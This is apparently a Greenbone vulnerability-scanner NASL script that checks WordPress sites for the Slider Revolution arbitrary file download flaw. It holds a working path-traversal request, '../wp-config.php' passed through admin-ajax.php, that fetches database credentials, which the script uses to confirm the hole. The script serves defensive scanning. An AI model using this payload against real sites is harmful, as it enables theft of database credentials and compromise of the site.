# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105070");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2023-07-26T05:05:09+0000");

  script_name("WordPress Slider Revolution Arbitrary File Download Vulnerability");

  script_xref(name:"URL", value:"http://h3ck3rcyb3ra3na.wordpress.com/2014/08/15/wordpress-slider-revolution-responsive-4-1-4-arbitrary-file-download-0day/");

  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-08-21 11:02:57 +0200 (Thu, 21 Aug 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
application and the underlying system. Other attacks are also possible.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check the response");
  script_tag(name:"solution", value:"Ask the vendor for an update");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"WordPress Slider Revolution is prone to an arbitrary file download vulnerability");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( "DB_NAME" >< buf && "DB_USER" >< buf && "DB_PASSWORD" >< buf ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
